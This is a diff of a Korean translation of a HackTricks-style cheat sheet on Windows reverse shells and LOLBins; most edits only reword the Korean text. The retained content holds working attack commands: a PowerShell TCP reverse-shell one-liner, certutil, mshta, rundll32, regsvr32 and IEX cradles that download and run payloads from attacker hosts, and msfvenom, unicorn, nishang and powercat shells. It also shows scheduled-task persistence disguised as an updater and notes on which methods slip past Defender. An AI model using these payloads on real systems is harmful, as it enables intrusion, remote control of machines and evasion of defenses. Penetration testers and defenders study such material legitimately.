@@ -1,11 +1,13 @@
 # Shells - Windows
 
+{{#include ../../banners/hacktricks-training.md}}
+
 ## Lolbas
 
-[lolbas-project.github.io](https://lolbas-project.github.io/) 페이지는 Windows를 위한 것으로, [https://gtfobins.github.io/](https://gtfobins.github.io/)가 Linux를 위한 것과 같습니다.<sup>[[13]](#references)[[14]](#references)</sup>
-Windows는 프로세스 보안을 위해 access tokens와 privileges를 사용하며, Windows 11에는 선택적으로 사용할 수 있는 `sudo` command도 포함되어 있습니다.<sup>[[11]](#references)[[12]](#references)</sup> 일부 **binaries**를 악용하여 **arbitrary code를 실행하는 것**과 같이 예상치 못한 작업을 수행할 수 있는 **방법**을 알아두면 유용합니다.<sup>[[13]](#references)</sup>
+[lolbas-project.github.io](https://lolbas-project.github.io/) 페이지는 Windows용이며, [https://gtfobins.github.io/](https://gtfobins.github.io/)가 Linux용인 것과 같습니다.<sup>[[13]](#references)[[14]](#references)</sup>
+Windows는 프로세스 보안을 위해 access token과 privilege를 사용하며, Windows 11에는 선택적으로 사용할 수 있는 `sudo` command도 포함되어 있습니다.<sup>[[11]](#references)[[12]](#references)</sup> 일부 **binaries**가 **arbitrary code 실행**과 같은 예상하지 못한 작업을 수행하도록 어떻게 (악의적으로) 사용될 수 있는지 알아두는 것이 유용합니다.<sup>[[13]](#references)</sup>
 
-아래에 수집된 기본 Windows reverse-shell payloads는 HighOn.Coffee 및 PayloadsAllTheThings cheat sheets에도 문서화되어 있습니다. 대상에 맞게 경로와 설치된 interpreters를 조정하십시오.<sup>[[1]](#references)[[4]](#references)</sup>
+아래에 수집된 기본 Windows reverse-shell payload는 HighOn.Coffee 및 PayloadsAllTheThings cheat sheet에도 문서화되어 있습니다. 대상에 맞게 경로와 설치된 interpreter를 조정하십시오.<sup>[[1]](#references)[[4]](#references)</sup>
 
 ## NC
 ```bash
@@ -27,7 +29,7 @@ ncat -l <PORT eg.443> --ssl
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/)는 portable하고 secure한 Netcat 대안입니다**. Unix 계열 시스템과 Win32에서 작동합니다. 강력한 암호화, 프로그램 실행, 사용자 지정 source port, 지속적인 재연결 등의 기능을 제공하는 sbd는 TCP/IP 통신을 위한 다목적 솔루션입니다. Windows 사용자는 Kali Linux 배포판의 sbd.exe 버전을 Netcat의 안정적인 대체 도구로 사용할 수 있습니다.<sup>[[15]](#references)</sup>
+**[sbd](https://www.kali.org/tools/sbd/)는 portable하고 secure한 Netcat 대안**입니다. Unix 계열 시스템과 Win32에서 작동합니다. 강력한 encryption, program execution, customizable source ports, continuous reconnection 등의 기능을 제공하는 sbd는 TCP/IP 통신을 위한 다목적 솔루션입니다. Windows 사용자는 Kali Linux 배포판의 sbd.exe 버전을 Netcat의 안정적인 대체품으로 사용할 수 있습니다.<sup>[[15]](#references)</sup>
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -82,18 +84,18 @@ Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadStr
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
 네트워크 호출을 수행하는 프로세스: **powershell.exe**\
-디스크에 기록된 Payload: **NO** (_적어도 procmon을 사용해 제가 찾을 수 있었던 위치에는 없었습니다 !_).<sup>[[5]](#references)</sup>
+디스크에 기록된 Payload: **아니요** (_적어도 procmon을 사용해 제가 찾을 수 있는 곳에는 없었습니다 !_).<sup>[[5]](#references)</sup>
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
 네트워크 호출을 수행하는 프로세스: **svchost.exe**\
 디스크에 기록된 Payload: **WebDAV client local cache**.<sup>[[5]](#references)</sup>
 
-**One liner:**
+**한 줄 명령:**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
-**이 문서 끝에서 다양한 Powershell Shells에 대한 정보를 더 확인하세요**
+**이 문서의 끝에서 다양한 Powershell Shells에 대한 자세한 정보를 확인할 수 있습니다**
 
 ## Mshta
 
@@ -165,7 +167,7 @@ Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given
 
 ## **Rundll32**
 
-[**Dll hello world 예제**](https://github.com/carterjones/hello-world-dll)
+[**DLL hello world 예제**](https://github.com/carterjones/hello-world-dll)
 
 - [여기에서](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>
 ```bash
@@ -179,7 +181,7 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http
 
 **Rundll32 - sct**
 
-[mshta - sct](#mshta-sct) 섹션에 표시된 scriptlet을 재사용합니다. 해당 scriptlet의 첫 주석에 관련 `rundll32.exe` launcher가 포함되어 있습니다.<sup>[[8]](#references)</sup>
+[mshta - sct](#mshta-sct) 섹션에 표시된 scriptlet을 재사용합니다. 해당 scriptlet의 앞부분 주석에 관련 `rundll32.exe` launcher가 포함되어 있습니다.<sup>[[8]](#references)</sup>
 
 #### **Rundll32 - Metasploit**
 ```bash
@@ -208,12 +210,12 @@ regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 ```
 **Defender에 의해 탐지됨**
 
-#### Regsvr32 – /i 인수를 사용한 임의 DLL export (게이트키핑 및 persistence)
+#### Regsvr32 – /i 인수를 사용한 임의 DLL export (gatekeeping 및 persistence)
 
-원격 scriptlet(`scrobj.dll`)을 로드하는 것 외에도 `regsvr32.exe`는 로컬 DLL을 로드하고 해당 DLL의 `DllRegisterServer`/`DllUnregisterServer` export를 호출합니다. Custom loader는 서명된 LOLBin으로 위장하면서 임의의 code를 실행하기 위해 이를 자주 악용합니다. 실제 환경에서 확인된 두 가지 tradecraft 참고 사항은 다음과 같습니다.<sup>[[6]](#references)</sup>
+원격 scriptlet(`scrobj.dll`)을 로드하는 것 외에도 `regsvr32.exe`는 로컬 DLL을 로드하고 해당 DLL의 `DllRegisterServer`/`DllUnregisterServer` export를 호출합니다. Custom loader는 서명된 LOLBin으로 위장하면서 임의의 코드를 실행하기 위해 이를 자주 악용합니다. 실제 환경에서 확인된 두 가지 tradecraft 참고 사항:<sup>[[6]](#references)</sup>
 
-- 게이트키핑 인수: `/i:<arg>`를 통해 특정 switch가 전달되지 않으면 DLL이 종료됩니다. 예를 들어 Chromium renderer child를 모방하기 위해 `/i:--type=renderer`를 사용합니다. 이를 통해 우발적인 실행을 줄이고 sandbox를 방해할 수 있습니다.
-- Persistence: `regsvr32`가 silent 및 high privileges로 필요한 `/i` 인수와 함께 DLL을 실행하도록 예약하여 updater task로 위장합니다:
+- Gatekeeping 인수: `/i:<arg>`를 통해 특정 switch가 전달되지 않으면 DLL이 종료됩니다. 예: Chromium renderer child를 모방하기 위한 `/i:--type=renderer`. 이를 통해 우발적인 실행을 줄이고 sandbox를 방해합니다.
+- Persistence: 자동 업데이트 프로그램 작업으로 위장하여 `regsvr32`가 silent 및 high privileges로 필요한 `/i` 인수와 함께 DLL을 실행하도록 예약합니다:
 ```powershell
 Register-ScheduledTask \
 -Action (New-ScheduledTaskAction -Execute "regsvr32" -Argument "/s /i:--type=renderer \"%APPDATA%\Microsoft\SystemCertificates\<name>.dll\"") \
@@ -224,7 +226,7 @@ Register-ScheduledTask \
 -RunLevel Highest
 ```
 
-다음 항목도 참고하세요: JS loader를 staging한 후 나중에 `regsvr32`로 persistence를 수행하는 ClickFix clipboard-to-PowerShell variant입니다.<sup>[[6]](#references)</sup>
+JS loader를 staging한 후 `regsvr32`로 persistence를 수행하는 ClickFix clipboard-to-PowerShell variant도 참고하세요.<sup>[[6]](#references)</sup>
 {{#ref}}
 ../../generic-methodologies-and-resources/phishing-methodology/clipboard-hijacking.md
 {{#endref}}
@@ -262,11 +264,11 @@ run
 
 - [여기에서](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>
 
-B64dll을 다운로드하고, 디코딩한 후 실행합니다.<sup>[[5]](#references)</sup>
+B64dll을 다운로드하고, 디코딩한 다음 실행합니다.<sup>[[5]](#references)</sup>
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
 ```
-B64exe를 다운로드하고, 디코드한 다음 실행합니다.<sup>[[5]](#references)</sup>
+B64exe를 다운로드하고 디코딩한 후 실행합니다.<sup>[[5]](#references)</sup>
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 ```
@@ -280,13 +282,13 @@ powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
 ```
-**Defender에 의해 탐지됨**
+**Defender가 탐지함**
 
 ## PS-Bat
 ```bash
 \\webdavserver\folder\batchfile.bat
 ```
-네트워크 호출을 수행하는 프로세스: **svchost.exe**\
+네트워크 호출을 수행하는 Process: **svchost.exe**\
 디스크에 기록된 Payload: **WebDAV client local cache**.<sup>[[5]](#references)</sup>
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
@@ -296,11 +298,11 @@ impacket-smbserver -smb2support kali `pwd`
 ```bash
 \\10.8.0.3\kali\shell.bat
 ```
-**Defender에 의해 탐지됨**
+**defender에 의해 탐지됨**
 
 ## **MSIExec**
 
-공격자
+Attacker
 ```
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
 python -m SimpleHTTPServer 80
@@ -317,7 +319,7 @@ victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```bash
 wmic os get /format:"https://webserver/payload.xsl"
 ```
-예시 xsl 파일은 [여기에서](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7) 확인할 수 있습니다.<sup>[[10]](#references)</sup>
+Example xsl file [from here](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7).<sup>[[10]](#references)</sup>
 ```xml
 <?xml version='1.0'?>
 <stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
@@ -331,7 +333,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 **탐지되지 않음**
 
-**stager wmic를 사용하면 Koadic zombie를 매우 쉽게 download & execute할 수 있습니다**.<sup>[[3]](#references)</sup>
+**stager wmic를 사용하면 Koadic zombie를 매우 쉽게 download하고 execute할 수 있습니다.**<sup>[[3]](#references)</sup>
 
 ## Msbuild
 
@@ -339,8 +341,8 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
-이 project는 application whitelisting 및 `powershell.exe` restrictions을 우회하고 PowerShell과 유사한 shell을 제공할 수 있는 PowerShell host인 MSBuildShell을 설명합니다.<sup>[[16]](#references)</sup>\
-이 파일을 download한 후 execute하기만 하면 됩니다: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj).<sup>[[16]](#references)</sup>
+이 프로젝트는 application whitelisting 및 `powershell.exe` 제한을 우회하고 PowerShell과 유사한 shell을 제공할 수 있는 PowerShell host인 MSBuildShell을 문서화합니다.<sup>[[16]](#references)</sup>\
+다음 파일을 다운로드하여 실행하기만 하면 됩니다: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj).<sup>[[16]](#references)</sup>
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 ```
@@ -348,17 +350,17 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 
 ## **CSC**
 
-피해자 시스템에서 C# 코드를 컴파일합니다.<sup>[[17]](#references)[[18]](#references)</sup>
+피해자 머신에서 C# 코드를 컴파일합니다.<sup>[[17]](#references)[[18]](#references)</sup>
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
-Puedes descargar un reverse shell básico en C# desde aquí: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
+여기에서 기본 C# reverse shell을 다운로드할 수 있습니다: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
-**No detectado**
+**탐지되지 않음**
 
 ## **Regasm/Regsvc**
 
-- [Desde aquí](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>
+- [여기에서](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/) 다운로드할 수 있습니다.<sup>[[5]](#references)</sup>
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
 ```
@@ -382,27 +384,27 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-**Shells** 폴더에는 다양한 Shells가 있습니다. Invoke-_PowerShellTcp.ps1_을 다운로드하고 실행하려면 스크립트의 복사본을 만든 다음 파일 끝에 다음을 추가합니다:<sup>[[19]](#references)</sup>
+**Shells** 폴더에는 다양한 Shell이 있습니다. Invoke-_PowerShellTcp.ps1_을 다운로드하고 실행하려면 스크립트의 복사본을 만든 다음 파일 끝에 다음을 추가합니다:<sup>[[19]](#references)</sup>
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-웹 서버에서 스크립트를 제공하기 시작하고 피해자 측에서 실행합니다:<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>
+웹 서버에서 스크립트 제공을 시작하고 피해자 측에서 실행합니다:<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
-Defender는 이를 악성 코드로 탐지하지 않습니다(아직까지는, 2019년 3월 4일 기준).
+Defender는 이를 악성 코드로 탐지하지 않습니다(현재까지는, 2019년 3월 4일).
 
-**TODO: 다른 nishang 셸 확인**
+**TODO: 다른 nishang shells 확인**
 
 ### **PS-Powercat**
 
 [**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)
 
-다운로드하고, 웹 서버를 시작하고, listener를 시작한 다음 victim 측에서 실행합니다:<sup>[[22]](#references)</sup>
+Download하고, 웹 서버를 시작한 다음, listener를 시작하고, victim 측에서 이를 실행합니다:<sup>[[22]](#references)</sup>
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-Defender는 이를 malicious code로 탐지하지 않습니다(아직까지는, 2019년 3월 4일).
+Defender는 이를 악성 코드로 탐지하지 않는다(현재 기준, 2019년 3월 4일).
 
 **powercat에서 제공하는 기타 옵션:**
 
@@ -427,50 +429,50 @@ powercat -l -p 443 -i C:\inputfile -rep
 
 [https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)
 
-powershell launcher를 생성하여 파일에 저장한 다음 다운로드하고 실행합니다.<sup>[[23]](#references)[[26]](#references)[[27]](#references)</sup>
+powershell launcher를 생성하고 파일에 저장한 후 다운로드하여 실행합니다.<sup>[[23]](#references)[[26]](#references)[[27]](#references)</sup>
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-**악성 코드로 탐지됨**
+**악성 코드로 감지됨**
 
 ### MSF-Unicorn
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-unicorn을 사용하여 metasploit backdoor의 powershell 버전을 생성합니다.<sup>[[24]](#references)</sup>
+unicorn을 사용하여 metasploit 백도어의 powershell 버전을 생성합니다.<sup>[[24]](#references)</sup>
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
-생성된 resource로 msfconsole을 시작합니다:<sup>[[24]](#references)</sup>
+생성한 resource를 사용해 msfconsole을 시작합니다.<sup>[[24]](#references)</sup>
 ```
 msfconsole -r unicorn.rc
 ```
-_powershell_attack.txt_ 파일을 제공하는 웹 서버를 시작하고 피해자에서 실행합니다:<sup>[[24]](#references)</sup>
+_powershell_attack.txt_ 파일을 제공하는 웹 서버를 시작하고 victim에서 실행합니다:<sup>[[24]](#references)</sup>
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
 **악성 코드로 탐지됨**
 
-## 추가 정보
+## 더 보기
 
-[PS>Attack](https://github.com/jaredhaight/PSAttack) 일부 공격용 PS modules가 미리 로드된 PS console (암호화됨)\
+[PS>Attack](https://github.com/jaredhaight/PSAttack) 일부 offensive PS modules가 미리 로드된 PS console (cyphered)\
 [https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
-[WinPWN](https://github.com/SecureThisShit/WinPwn) 일부 공격용 PS modules와 proxy detection (IEX)이 포함된 PS console.<sup>[[25]](#references)</sup>
+[WinPWN](https://github.com/SecureThisShit/WinPwn) 일부 offensive PS modules와 proxy detection이 포함된 PS console (IEX).<sup>[[25]](#references)</sup>
 
 ## References
 
 - [1] [Reverse Shell Cheat Sheet: PHP, ASP, Netcat, Bash & Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
-- [2] [Arno0x의 GitHub Gists](https://gist.github.com/Arno0x)
+- [2] [Arno0x's GitHub Gists](https://gist.github.com/Arno0x)
 - [3] [Koadic – COM Command & Control Framework](https://www.hackingarticles.in/koadic-com-command-control-framework/)
 - [4] [Reverse Shell Cheatsheet - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
-- [5] [원격 Payload를 다운로드하고 임의의 Code를 실행하는 Windows Oneliner](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+- [5] [Windows Oneliners to Download Remote Payload and Execute Arbitrary Code](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 - [6] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
 - [7] [calc.hta – HTA reverse execution example (Arno0x gist)](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
 - [8] [scriptlet.sct – mshta/rundll32 scriptlet example (Arno0x gist)](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
 - [9] [regsvr32.sct – Regsvr32 scriptlet example (Arno0x gist)](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
 - [10] [wmic.xsl – WMIC XSL stylesheet example (Arno0x gist)](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)
 - [11] [Access Tokens – Win32 apps (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
-- [12] [Windows용 Sudo (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/advanced-settings/sudo/)
+- [12] [Sudo for Windows (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/advanced-settings/sudo/)
 - [13] [LOLBAS](https://lolbas-project.github.io/)
 - [14] [GTFOBins](https://gtfobins.github.io/)
 - [15] [sbd | Kali Linux Tools](https://www.kali.org/tools/sbd/)
